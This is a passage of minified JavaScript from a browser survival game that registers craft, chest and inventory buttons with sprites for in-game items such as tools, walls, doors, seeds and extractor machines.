      this.craft_buttons[ue.HAMMER] = rs(60, 60, 0, sprite[Ie.CRAFT_HAMMER], 3);
      this.craft_buttons[ue.HAMMER].id = ue.HAMMER;
      this.craft_buttons[ue.HAMMER_GOLD] = rs(60, 60, 0, sprite[Ie.CRAFT_HAMMER_GOLD], 3);
      this.craft_buttons[ue.HAMMER_GOLD].id = ue.HAMMER_GOLD;
      this.craft_buttons[ue.HAMMER_DIAMOND] = rs(60, 60, 0, sprite[Ie.CRAFT_HAMMER_DIAMOND], 3);
      this.craft_buttons[ue.HAMMER_DIAMOND].id = ue.HAMMER_DIAMOND;
      this.craft_buttons[ue.HAMMER_AMETHYST] = rs(60, 60, 0, sprite[Ie.CRAFT_HAMMER_AMETHYST], 3);
      this.craft_buttons[ue.HAMMER_AMETHYST].id = ue.HAMMER_AMETHYST;
      this.craft_buttons[ue.HAMMER_REIDITE] = rs(60, 60, 0, sprite[Ie.CRAFT_HAMMER_REIDITE], 3);
      this.craft_buttons[ue.HAMMER_REIDITE].id = ue.HAMMER_REIDITE;
      this.craft_buttons[ue.AMETHYST_WALL] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_WALL], 3);
      this.craft_buttons[ue.AMETHYST_WALL].id = ue.AMETHYST_WALL;
      this.craft_buttons[ue.AMETHYST_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_SPIKE], 3);
      this.craft_buttons[ue.AMETHYST_SPIKE].id = ue.AMETHYST_SPIKE;
      this.craft_buttons[ue.AMETHYST_DOOR] = rs(60, 60, 0, sprite[Ie.CRAFT_DOOR_AMETHYST_CLOSE], 3);
      this.craft_buttons[ue.AMETHYST_DOOR].id = ue.AMETHYST_DOOR;
      this.craft_buttons[ue.CAP_SCARF] = rs(60, 60, 0, sprite[Ie.CRAFT_CAP_SCARF], 3);
      this.craft_buttons[ue.CAP_SCARF].id = ue.CAP_SCARF;
      this.craft_buttons[ue.BLUE_CORD] = rs(60, 60, 0, sprite[Ie.CRAFT_BLUE_CORD], 3);
      this.craft_buttons[ue.BLUE_CORD].id = ue.BLUE_CORD;
      this.craft_buttons[ue.LOCK] = rs(60, 60, 0, sprite[Ie.CRAFT_LOCK], 3);
      this.craft_buttons[ue.LOCK].id = ue.LOCK;
      this.craft_buttons[ue.RESURRECTION] = rs(60, 60, 0, sprite[Ie.CRAFT_RESURRECTION], 3);
      this.craft_buttons[ue.RESURRECTION].id = ue.RESURRECTION;
      this.craft_buttons[ue.LOCKPICK] = rs(60, 60, 0, sprite[Ie.CRAFT_LOCKPICK], 3);
      this.craft_buttons[ue.LOCKPICK].id = ue.LOCKPICK;
      this.craft_buttons[ue.TOTEM] = rs(60, 60, 0, sprite[Ie.CRAFT_TOTEM], 3);
      this.craft_buttons[ue.TOTEM].id = ue.TOTEM;
      this.craft_buttons[ue.AMETHYST_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_HELMET], 3);
      this.craft_buttons[ue.AMETHYST_HELMET].id = ue.AMETHYST_HELMET;
      this.craft_buttons[ue.SUPER_HAMMER] = rs(60, 60, 0, sprite[Ie.CRAFT_SUPER_HAMMER], 3);
      this.craft_buttons[ue.SUPER_HAMMER].id = ue.SUPER_HAMMER;
      this.craft_buttons[ue.BRIDGE] = rs(60, 60, 0, sprite[Ie.CRAFT_BRIDGE], 3);
      this.craft_buttons[ue.BRIDGE].id = ue.BRIDGE;
      this.craft_buttons[ue.WOOD_TOWER] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_TOWER], 3);
      this.craft_buttons[ue.WOOD_TOWER].id = ue.WOOD_TOWER;
      this.craft_buttons[ue.BOAT] = rs(60, 60, 0, sprite[Ie.CRAFT_BOAT], 3);
      this.craft_buttons[ue.BOAT].id = ue.BOAT;
      this.craft_buttons[ue.SLED] = rs(60, 60, 0, sprite[Ie.CRAFT_SLED], 3);
      this.craft_buttons[ue.SLED].id = ue.SLED;
      this.craft_buttons[ue.PLANE] = rs(60, 60, 0, sprite[Ie.CRAFT_PLANE], 3);
      this.craft_buttons[ue.PLANE].id = ue.PLANE;
      this.craft_buttons[ue.SADDLE] = rs(60, 60, 0, sprite[Ie.CRAFT_SADDLE], 3);
      this.craft_buttons[ue.SADDLE].id = ue.SADDLE;
      this.craft_buttons[ue.MOUNT_BOAR] = rs(60, 60, 0, sprite[Ie.CRAFT_MOUNT_BOAR], 3);
      this.craft_buttons[ue.MOUNT_BOAR].id = ue.MOUNT_BOAR;
      this.craft_buttons[ue.BABY_DRAGON] = rs(60, 60, 0, sprite[Ie.CRAFT_BABY_DRAGON], 3);
      this.craft_buttons[ue.BABY_DRAGON].id = ue.BABY_DRAGON;
      this.craft_buttons[ue.BABY_MAMMOTH] = rs(60, 60, 0, sprite[Ie.CRAFT_BABY_MAMMOTH], 3);
      this.craft_buttons[ue.BABY_MAMMOTH].id = ue.BABY_MAMMOTH;
      this.craft_buttons[ue.CRAB_BOSS] = rs(60, 60, 0, sprite[Ie.CRAFT_CRAB_BOSS], 3);
      this.craft_buttons[ue.CRAB_BOSS].id = ue.CRAB_BOSS;
      this.craft_buttons[ue.BOTTLE_EMPTY] = rs(60, 60, 0, sprite[Ie.CRAFT_BOTTLE_EMPTY], 3);
      this.craft_buttons[ue.BOTTLE_EMPTY].id = ue.BOTTLE_EMPTY;
      this.craft_buttons[ue.BOTTLE_FULL] = rs(60, 60, 0, sprite[Ie.CRAFT_BOTTLE_FULL], 3);
      this.craft_buttons[ue.BOTTLE_FULL].id = ue.BOTTLE_FULL;
      this.craft_buttons[ue.BOTTLE_FULL_2] = rs(60, 60, 0, sprite[Ie.CRAFT_BOTTLE_FULL], 3);
      this.craft_buttons[ue.BOTTLE_FULL_2].id = ue.BOTTLE_FULL_2;
      this.craft_buttons[ue.BOTTLE_FULL_3] = rs(60, 60, 0, sprite[Ie.CRAFT_BOTTLE_FULL], 3);
      this.craft_buttons[ue.BOTTLE_FULL_3].id = ue.BOTTLE_FULL_3;
      this.craft_buttons[ue.SHOVEL] = rs(60, 60, 0, sprite[Ie.CRAFT_SHOVEL], 3);
      this.craft_buttons[ue.SHOVEL].id = ue.SHOVEL;
      this.craft_buttons[ue.SHOVEL_GOLD] = rs(60, 60, 0, sprite[Ie.CRAFT_SHOVEL_GOLD], 3);
      this.craft_buttons[ue.SHOVEL_GOLD].id = ue.SHOVEL_GOLD;
      this.craft_buttons[ue.SHOVEL_DIAMOND] = rs(60, 60, 0, sprite[Ie.CRAFT_SHOVEL_DIAMOND], 3);
      this.craft_buttons[ue.SHOVEL_DIAMOND].id = ue.SHOVEL_DIAMOND;
      this.craft_buttons[ue.SHOVEL_AMETHYST] = rs(60, 60, 0, sprite[Ie.CRAFT_SHOVEL_AMETHYST], 3);
      this.craft_buttons[ue.SHOVEL_AMETHYST].id = ue.SHOVEL_AMETHYST;
      this.craft_buttons[ue.SPANNER] = rs(60, 60, 0, sprite[Ie.CRAFT_SPANNER], 3);
      this.craft_buttons[ue.SPANNER].id = ue.SPANNER;
      this.craft_buttons[ue.WATERING_CAN] = rs(60, 60, 0, sprite[Ie.CRAFT_WATERING_CAN], 3);
      this.craft_buttons[ue.WATERING_CAN].id = ue.WATERING_CAN;
      this.craft_buttons[ue.WHEAT_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_WHEAT_SEED], 3);
      this.craft_buttons[ue.WHEAT_SEED].id = ue.WHEAT_SEED;
      this.craft_buttons[ue.COOKIE] = rs(60, 60, 0, sprite[Ie.CRAFT_COOKIE], 3);
      this.craft_buttons[ue.COOKIE].id = ue.COOKIE;
      this.craft_buttons[ue.WINDMILL] = rs(60, 60, 0, sprite[Ie.CRAFT_WINDMILL], 3);
      this.craft_buttons[ue.WINDMILL].id = ue.WINDMILL;
      this.craft_buttons[ue.SUPER_DIVING_SUIT] = rs(60, 60, 0, sprite[Ie.CRAFT_SUPER_DIVING_SUIT], 3);
      this.craft_buttons[ue.SUPER_DIVING_SUIT].id = ue.SUPER_DIVING_SUIT;
      this.craft_buttons[ue.DIVING_MASK] = rs(60, 60, 0, sprite[Ie.CRAFT_DIVING_MASK], 3);
      this.craft_buttons[ue.DIVING_MASK].id = ue.DIVING_MASK;
      this.craft_buttons[ue.WATERING_CAN_FULL] = rs(60, 60, 0, sprite[Ie.CRAFT_WATERING_CAN_FULL], 3);
      this.craft_buttons[ue.WATERING_CAN_FULL].id = ue.WATERING_CAN_FULL;
      this.craft_buttons[ue.CAKE] = rs(60, 60, 0, sprite[Ie.CRAFT_CAKE], 3);
      this.craft_buttons[ue.CAKE].id = ue.CAKE;
      this.craft_buttons[ue.BREAD] = rs(60, 60, 0, sprite[Ie.CRAFT_BREAD], 3);
      this.craft_buttons[ue.BREAD].id = ue.BREAD;
      this.craft_buttons[ue.FOODFISH_COOKED] = rs(60, 60, 0, sprite[Ie.CRAFT_FOODFISH_COOKED], 3);
      this.craft_buttons[ue.FOODFISH_COOKED].id = ue.FOODFISH_COOKED;
      this.craft_buttons[ue.PLOT] = rs(60, 60, 0, sprite[Ie.CRAFT_PLOT], 3);
      this.craft_buttons[ue.PLOT].id = ue.PLOT;
      this.craft_buttons[ue.BREAD_OVEN] = rs(60, 60, 0, sprite[Ie.CRAFT_BREAD_OVEN], 3);
      this.craft_buttons[ue.BREAD_OVEN].id = ue.BREAD_OVEN;
      this.craft_buttons[ue.SANDWICH] = rs(60, 60, 0, sprite[Ie.CRAFT_SANDWICH], 3);
      this.craft_buttons[ue.SANDWICH].id = ue.SANDWICH;
      this.craft_buttons[ue.DRAGON_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_DRAGON_HELMET], 3);
      this.craft_buttons[ue.DRAGON_HELMET].id = ue.DRAGON_HELMET;
      this.craft_buttons[ue.DRAGON_SWORD] = rs(60, 60, 0, sprite[Ie.INV_DRAGON_SWORD], 3);
      this.craft_buttons[ue.DRAGON_SWORD].id = ue.DRAGON_SWORD;
      this.craft_buttons[ue.CROWN_GREEN] = rs(60, 60, 0, sprite[Ie.CRAFT_CROWN_GREEN], 3);
      this.craft_buttons[ue.CROWN_GREEN].id = ue.CROWN_GREEN;
      this.craft_buttons[ue.CROWN_ORANGE] = rs(60, 60, 0, sprite[Ie.CRAFT_CROWN_ORANGE], 3);
      this.craft_buttons[ue.CROWN_ORANGE].id = ue.CROWN_ORANGE;
      this.craft_buttons[ue.CROWN_BLUE] = rs(60, 60, 0, sprite[Ie.CRAFT_CROWN_BLUE], 3);
      this.craft_buttons[ue.CROWN_BLUE].id = ue.CROWN_BLUE;
      this.craft_buttons[ue.HOOD] = rs(60, 60, 0, sprite[Ie.CRAFT_HOOD], 3);
      this.craft_buttons[ue.HOOD].id = ue.HOOD;
      this.craft_buttons[ue.PEASANT] = rs(60, 60, 0, sprite[Ie.CRAFT_PEASANT], 3);
      this.craft_buttons[ue.PEASANT].id = ue.PEASANT;
      this.craft_buttons[ue.WINTER_PEASANT] = rs(60, 60, 0, sprite[Ie.CRAFT_WINTER_PEASANT], 3);
      this.craft_buttons[ue.WINTER_PEASANT].id = ue.WINTER_PEASANT;
      this.craft_buttons[ue.WINTER_HOOD] = rs(60, 60, 0, sprite[Ie.CRAFT_WINTER_HOOD], 3);
      this.craft_buttons[ue.WINTER_HOOD].id = ue.WINTER_HOOD;
      this.craft_buttons[ue.BUCKET_FULL] = rs(60, 60, 0, sprite[Ie.CRAFT_BUCKET_FULL], 3);
      this.craft_buttons[ue.BUCKET_FULL].id = ue.BUCKET_FULL;
      this.craft_buttons[ue.BUCKET_EMPTY] = rs(60, 60, 0, sprite[Ie.CRAFT_BUCKET_EMPTY], 3);
      this.craft_buttons[ue.BUCKET_EMPTY].id = ue.BUCKET_EMPTY;
      this.craft_buttons[ue.WELL] = rs(60, 60, 0, sprite[Ie.CRAFT_WELL], 3);
      this.craft_buttons[ue.WELL].id = ue.WELL;
      this.craft_buttons[ue.SIGN] = rs(60, 60, 0, sprite[Ie.CRAFT_SIGN], 3);
      this.craft_buttons[ue.SIGN].id = ue.SIGN;
      this.craft_buttons[ue.PUMPKIN_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_PUMPKIN_SEED], 3);
      this.craft_buttons[ue.PUMPKIN_SEED].id = ue.PUMPKIN_SEED;
      this.craft_buttons[ue.GARLIC_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_GARLIC_SEED], 3);
      this.craft_buttons[ue.GARLIC_SEED].id = ue.GARLIC_SEED;
      this.craft_buttons[ue.ROOF] = rs(60, 60, 0, sprite[Ie.CRAFT_ROOF], 3);
      this.craft_buttons[ue.ROOF].id = ue.ROOF;
      this.craft_buttons[ue.THORNBUSH_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_THORNBUSH_SEED], 3);
      this.craft_buttons[ue.THORNBUSH_SEED].id = ue.THORNBUSH_SEED;
      this.craft_buttons[ue.TOMATO_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_TOMATO_SEED], 3);
      this.craft_buttons[ue.TOMATO_SEED].id = ue.TOMATO_SEED;
      this.craft_buttons[ue.CARROT_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_CARROT_SEED], 3);
      this.craft_buttons[ue.CARROT_SEED].id = ue.CARROT_SEED;
      this.craft_buttons[ue.WATERMELON_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_WATERMELON_SEED], 3);
      this.craft_buttons[ue.WATERMELON_SEED].id = ue.WATERMELON_SEED;
      this.craft_buttons[ue.ALOE_VERA_SEED] = rs(60, 60, 0, sprite[Ie.CRAFT_ALOE_VERA_SEED], 3);
      this.craft_buttons[ue.ALOE_VERA_SEED].id = ue.ALOE_VERA_SEED;
      this.craft_buttons[ue.WOOD_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_SPEAR], 3);
      this.craft_buttons[ue.WOOD_SPEAR].id = ue.WOOD_SPEAR;
      this.craft_buttons[ue.DRAGON_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_DRAGON_SPEAR], 3);
      this.craft_buttons[ue.DRAGON_SPEAR].id = ue.DRAGON_SPEAR;
      this.craft_buttons[ue.CRAB_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_CRAB_SPEAR], 3);
      this.craft_buttons[ue.CRAB_SPEAR].id = ue.CRAB_SPEAR;
      this.craft_buttons[ue.BED] = rs(60, 60, 0, sprite[Ie.CRAFT_BED], 3);
      this.craft_buttons[ue.BED].id = ue.BED;
      this.craft_buttons[ue.CROWN_CRAB] = rs(60, 60, 0, sprite[Ie.CRAFT_CROWN_CRAB], 3);
      this.craft_buttons[ue.CROWN_CRAB].id = ue.CROWN_CRAB;
      this.chest_buttons[le.PITCHFORK] = rs(68, 68, 0, sprite[Ie.CHEST_PITCHFORK], 3);
      this.chest_buttons[le.PITCHFORK].id = le.PITCHFORK;
      this.inv_buttons[le.PITCHFORK] = rs(60, 60, 0, sprite[Ie.INV_PITCHFORK], 3);
      this.inv_buttons[le.PITCHFORK].id = le.PITCHFORK;
      this.craft_buttons[ue.PITCHFORK] = rs(60, 60, 0, sprite[Ie.CRAFT_PITCHFORK], 3);
      this.craft_buttons[ue.PITCHFORK].id = ue.PITCHFORK;
      this.chest_buttons[le.PITCHFORK2] = rs(68, 68, 0, sprite[Ie.CHEST_PITCHFORK2], 3);
      this.chest_buttons[le.PITCHFORK2].id = le.PITCHFORK2;
      this.inv_buttons[le.PITCHFORK2] = rs(60, 60, 0, sprite[Ie.INV_PITCHFORK2], 3);
      this.inv_buttons[le.PITCHFORK2].id = le.PITCHFORK2;
      this.craft_buttons[ue.PITCHFORK2] = rs(60, 60, 0, sprite[Ie.CRAFT_PITCHFORK2], 3);
      this.craft_buttons[ue.PITCHFORK2].id = ue.PITCHFORK2;
      this.chest_buttons[le.MACHETE] = rs(68, 68, 0, sprite[Ie.CHEST_MACHETE], 3);
      this.chest_buttons[le.MACHETE].id = le.MACHETE;
      this.inv_buttons[le.MACHETE] = rs(60, 60, 0, sprite[Ie.INV_MACHETE], 3);
      this.inv_buttons[le.MACHETE].id = le.MACHETE;
      this.craft_buttons[ue.MACHETE] = rs(60, 60, 0, sprite[Ie.CRAFT_MACHETE], 3);
      this.craft_buttons[ue.MACHETE].id = ue.MACHETE;
      this.chest_buttons[le.PILOT_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_PILOT_HELMET], 3);
      this.chest_buttons[le.PILOT_HELMET].id = le.PILOT_HELMET;
      this.inv_buttons[le.PILOT_HELMET] = rs(60, 60, 0, sprite[Ie.INV_PILOT_HELMET], 3);
      this.inv_buttons[le.PILOT_HELMET].id = le.PILOT_HELMET;
      this.craft_buttons[ue.PILOT_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_PILOT_HELMET], 3);
      this.craft_buttons[ue.PILOT_HELMET].id = ue.PILOT_HELMET;
      this.chest_buttons[le.PITCHFORK_PART] = rs(68, 68, 0, sprite[Ie.CHEST_PITCHFORK_PART], 3);
      this.chest_buttons[le.PITCHFORK_PART].id = le.PITCHFORK_PART;
      this.inv_buttons[le.PITCHFORK_PART] = rs(60, 60, 0, sprite[Ie.INV_PITCHFORK_PART], 3);
      this.inv_buttons[le.PITCHFORK_PART].id = le.PITCHFORK_PART;
      this.chest_buttons[le.SANDWORM_JUICE] = rs(68, 68, 0, sprite[Ie.CHEST_SANDWORM_JUICE], 3);
      this.chest_buttons[le.SANDWORM_JUICE].id = le.SANDWORM_JUICE;
      this.inv_buttons[le.SANDWORM_JUICE] = rs(60, 60, 0, sprite[Ie.INV_SANDWORM_JUICE], 3);
      this.inv_buttons[le.SANDWORM_JUICE].id = le.SANDWORM_JUICE;
      this.chest_buttons[le.PILOT_GLASSES] = rs(68, 68, 0, sprite[Ie.CHEST_PILOT_GLASSES], 3);
      this.chest_buttons[le.PILOT_GLASSES].id = le.PILOT_GLASSES;
      this.inv_buttons[le.PILOT_GLASSES] = rs(60, 60, 0, sprite[Ie.INV_PILOT_GLASSES], 3);
      this.inv_buttons[le.PILOT_GLASSES].id = le.PILOT_GLASSES;
      this.chest_buttons[le.EMERALD_MACHINE] = rs(68, 68, 0, sprite[Ie.CHEST_EMERALD_MACHINE], 3);
      this.chest_buttons[le.EMERALD_MACHINE].id = le.EMERALD_MACHINE;
      this.inv_buttons[le.EMERALD_MACHINE] = rs(60, 60, 0, sprite[Ie.INV_EMERALD_MACHINE], 3);
      this.inv_buttons[le.EMERALD_MACHINE].id = le.EMERALD_MACHINE;
      this.craft_buttons[ue.EMERALD_MACHINE] = rs(60, 60, 0, sprite[Ie.CRAFT_EMERALD_MACHINE], 3);
      this.craft_buttons[ue.EMERALD_MACHINE].id = ue.EMERALD_MACHINE;
      this.chest_buttons[le.WOOD_DOOR_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_WOOD_DOOR_SPIKE], 3);
      this.chest_buttons[le.WOOD_DOOR_SPIKE].id = le.WOOD_DOOR_SPIKE;
      this.inv_buttons[le.WOOD_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_WOOD_DOOR_SPIKE], 3);
      this.inv_buttons[le.WOOD_DOOR_SPIKE].id = le.WOOD_DOOR_SPIKE;
      this.craft_buttons[ue.WOOD_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_WOOD_DOOR_SPIKE], 3);
      this.craft_buttons[ue.WOOD_DOOR_SPIKE].id = ue.WOOD_DOOR_SPIKE;
      this.chest_buttons[le.STONE_DOOR_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_STONE_DOOR_SPIKE], 3);
      this.chest_buttons[le.STONE_DOOR_SPIKE].id = le.STONE_DOOR_SPIKE;
      this.inv_buttons[le.STONE_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_STONE_DOOR_SPIKE], 3);
      this.inv_buttons[le.STONE_DOOR_SPIKE].id = le.STONE_DOOR_SPIKE;
      this.craft_buttons[ue.STONE_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_STONE_DOOR_SPIKE], 3);
      this.craft_buttons[ue.STONE_DOOR_SPIKE].id = ue.STONE_DOOR_SPIKE;
      this.chest_buttons[le.GOLD_DOOR_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_GOLD_DOOR_SPIKE], 3);
      this.chest_buttons[le.GOLD_DOOR_SPIKE].id = le.GOLD_DOOR_SPIKE;
      this.inv_buttons[le.GOLD_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_GOLD_DOOR_SPIKE], 3);
      this.inv_buttons[le.GOLD_DOOR_SPIKE].id = le.GOLD_DOOR_SPIKE;
      this.craft_buttons[ue.GOLD_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_GOLD_DOOR_SPIKE], 3);
      this.craft_buttons[ue.GOLD_DOOR_SPIKE].id = ue.GOLD_DOOR_SPIKE;
      this.chest_buttons[le.DIAMOND_DOOR_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_DOOR_SPIKE], 3);
      this.chest_buttons[le.DIAMOND_DOOR_SPIKE].id = le.DIAMOND_DOOR_SPIKE;
      this.inv_buttons[le.DIAMOND_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_DOOR_SPIKE], 3);
      this.inv_buttons[le.DIAMOND_DOOR_SPIKE].id = le.DIAMOND_DOOR_SPIKE;
      this.craft_buttons[ue.DIAMOND_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_DOOR_SPIKE], 3);
      this.craft_buttons[ue.DIAMOND_DOOR_SPIKE].id = ue.DIAMOND_DOOR_SPIKE;
      this.chest_buttons[le.AMETHYST_DOOR_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_DOOR_SPIKE], 3);
      this.chest_buttons[le.AMETHYST_DOOR_SPIKE].id = le.AMETHYST_DOOR_SPIKE;
      this.inv_buttons[le.AMETHYST_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_DOOR_SPIKE], 3);
      this.inv_buttons[le.AMETHYST_DOOR_SPIKE].id = le.AMETHYST_DOOR_SPIKE;
      this.craft_buttons[ue.AMETHYST_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_DOOR_SPIKE], 3);
      this.craft_buttons[ue.AMETHYST_DOOR_SPIKE].id = ue.AMETHYST_DOOR_SPIKE;
      this.chest_buttons[le.REIDITE_DOOR_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_DOOR_SPIKE], 3);
      this.chest_buttons[le.REIDITE_DOOR_SPIKE].id = le.REIDITE_DOOR_SPIKE;
      this.inv_buttons[le.REIDITE_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_DOOR_SPIKE], 3);
      this.inv_buttons[le.REIDITE_DOOR_SPIKE].id = le.REIDITE_DOOR_SPIKE;
      this.craft_buttons[ue.REIDITE_DOOR_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_DOOR_SPIKE], 3);
      this.craft_buttons[ue.REIDITE_DOOR_SPIKE].id = ue.REIDITE_DOOR_SPIKE;
      this.chest_buttons[le.REIDITE_WALL] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_WALL], 3);
      this.chest_buttons[le.REIDITE_WALL].id = le.REIDITE_WALL;
      this.inv_buttons[le.REIDITE_WALL] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_WALL], 3);
      this.inv_buttons[le.REIDITE_WALL].id = le.REIDITE_WALL;
      this.craft_buttons[ue.REIDITE_WALL] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_WALL], 3);
      this.craft_buttons[ue.REIDITE_WALL].id = ue.REIDITE_WALL;
      this.chest_buttons[le.REIDITE_SPIKE] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_SPIKE], 3);
      this.chest_buttons[le.REIDITE_SPIKE].id = le.REIDITE_SPIKE;
      this.inv_buttons[le.REIDITE_SPIKE] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_SPIKE], 3);
      this.inv_buttons[le.REIDITE_SPIKE].id = le.REIDITE_SPIKE;
      this.craft_buttons[ue.REIDITE_SPIKE] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_SPIKE], 3);
      this.craft_buttons[ue.REIDITE_SPIKE].id = ue.REIDITE_SPIKE;
      this.chest_buttons[le.REIDITE_DOOR] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_DOOR], 3);
      this.chest_buttons[le.REIDITE_DOOR].id = le.REIDITE_DOOR;
      this.inv_buttons[le.REIDITE_DOOR] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_DOOR], 3);
      this.inv_buttons[le.REIDITE_DOOR].id = le.REIDITE_DOOR;
      this.craft_buttons[ue.REIDITE_DOOR] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_DOOR], 3);
      this.craft_buttons[ue.REIDITE_DOOR].id = ue.REIDITE_DOOR;
      this.chest_buttons[le.EXTRACTOR_MACHINE_STONE] = rs(68, 68, 0, sprite[Ie.CHEST_EXTRACTOR_MACHINE_STONE], 3);
      this.chest_buttons[le.EXTRACTOR_MACHINE_STONE].id = le.EXTRACTOR_MACHINE_STONE;
      this.inv_buttons[le.EXTRACTOR_MACHINE_STONE] = rs(60, 60, 0, sprite[Ie.INV_EXTRACTOR_MACHINE_STONE], 3);
      this.inv_buttons[le.EXTRACTOR_MACHINE_STONE].id = le.EXTRACTOR_MACHINE_STONE;
      this.craft_buttons[ue.EXTRACTOR_MACHINE_STONE] = rs(60, 60, 0, sprite[Ie.CRAFT_EXTRACTOR_MACHINE_STONE], 3);
      this.craft_buttons[ue.EXTRACTOR_MACHINE_STONE].id = ue.EXTRACTOR_MACHINE_STONE;
      this.chest_buttons[le.EXTRACTOR_MACHINE_GOLD] = rs(68, 68, 0, sprite[Ie.CHEST_EXTRACTOR_MACHINE_GOLD], 3);
      this.chest_buttons[le.EXTRACTOR_MACHINE_GOLD].id = le.EXTRACTOR_MACHINE_GOLD;
      this.inv_buttons[le.EXTRACTOR_MACHINE_GOLD] = rs(60, 60, 0, sprite[Ie.INV_EXTRACTOR_MACHINE_GOLD], 3);
      this.inv_buttons[le.EXTRACTOR_MACHINE_GOLD].id = le.EXTRACTOR_MACHINE_GOLD;
      this.craft_buttons[ue.EXTRACTOR_MACHINE_GOLD] = rs(60, 60, 0, sprite[Ie.CRAFT_EXTRACTOR_MACHINE_GOLD], 3);
      this.craft_buttons[ue.EXTRACTOR_MACHINE_GOLD].id = ue.EXTRACTOR_MACHINE_GOLD;
      this.chest_buttons[le.EXTRACTOR_MACHINE_DIAMOND] = rs(68, 68, 0, sprite[Ie.CHEST_EXTRACTOR_MACHINE_DIAMOND], 3);
      this.chest_buttons[le.EXTRACTOR_MACHINE_DIAMOND].id = le.EXTRACTOR_MACHINE_DIAMOND;
      this.inv_buttons[le.EXTRACTOR_MACHINE_DIAMOND] = rs(60, 60, 0, sprite[Ie.INV_EXTRACTOR_MACHINE_DIAMOND], 3);
      this.inv_buttons[le.EXTRACTOR_MACHINE_DIAMOND].id = le.EXTRACTOR_MACHINE_DIAMOND;
      this.craft_buttons[ue.EXTRACTOR_MACHINE_DIAMOND] = rs(60, 60, 0, sprite[Ie.CRAFT_EXTRACTOR_MACHINE_DIAMOND], 3);
      this.craft_buttons[ue.EXTRACTOR_MACHINE_DIAMOND].id = ue.EXTRACTOR_MACHINE_DIAMOND;
      this.chest_buttons[le.EXTRACTOR_MACHINE_AMETHYST] = rs(68, 68, 0, sprite[Ie.CHEST_EXTRACTOR_MACHINE_AMETHYST], 3);
      this.chest_buttons[le.EXTRACTOR_MACHINE_AMETHYST].id = le.EXTRACTOR_MACHINE_AMETHYST;
      this.inv_buttons[le.EXTRACTOR_MACHINE_AMETHYST] = rs(60, 60, 0, sprite[Ie.INV_EXTRACTOR_MACHINE_AMETHYST], 3);
      this.inv_buttons[le.EXTRACTOR_MACHINE_AMETHYST].id = le.EXTRACTOR_MACHINE_AMETHYST;
      this.craft_buttons[ue.EXTRACTOR_MACHINE_AMETHYST] = rs(60, 60, 0, sprite[Ie.CRAFT_EXTRACTOR_MACHINE_AMETHYST], 3);
      this.craft_buttons[ue.EXTRACTOR_MACHINE_AMETHYST].id = ue.EXTRACTOR_MACHINE_AMETHYST;
      this.chest_buttons[le.EXTRACTOR_MACHINE_REIDITE] = rs(68, 68, 0, sprite[Ie.CHEST_EXTRACTOR_MACHINE_REIDITE], 3);
      this.chest_buttons[le.EXTRACTOR_MACHINE_REIDITE].id = le.EXTRACTOR_MACHINE_REIDITE;
      this.inv_buttons[le.EXTRACTOR_MACHINE_REIDITE] = rs(60, 60, 0, sprite[Ie.INV_EXTRACTOR_MACHINE_REIDITE], 3);
      this.inv_buttons[le.EXTRACTOR_MACHINE_REIDITE].id = le.EXTRACTOR_MACHINE_REIDITE;
      this.craft_buttons[ue.EXTRACTOR_MACHINE_REIDITE] = rs(60, 60, 0, sprite[Ie.CRAFT_EXTRACTOR_MACHINE_REIDITE], 3);
      this.craft_buttons[ue.EXTRACTOR_MACHINE_REIDITE].id = ue.EXTRACTOR_MACHINE_REIDITE;
      this.chest_buttons[le.FLAME] = rs(68, 68, 0, sprite[Ie.CHEST_FLAME], 3);
      this.chest_buttons[le.FLAME].id = le.FLAME;
      this.inv_buttons[le.FLAME] = rs(60, 60, 0, sprite[Ie.INV_FLAME], 3);
      this.inv_buttons[le.FLAME].id = le.FLAME;
      this.inv_buttons[le.FLAME].info.img[2] = this.inv_buttons[le.FLAME].info.img[0];
      this.chest_buttons[le.LAVA_HEART] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_HEART], 3);
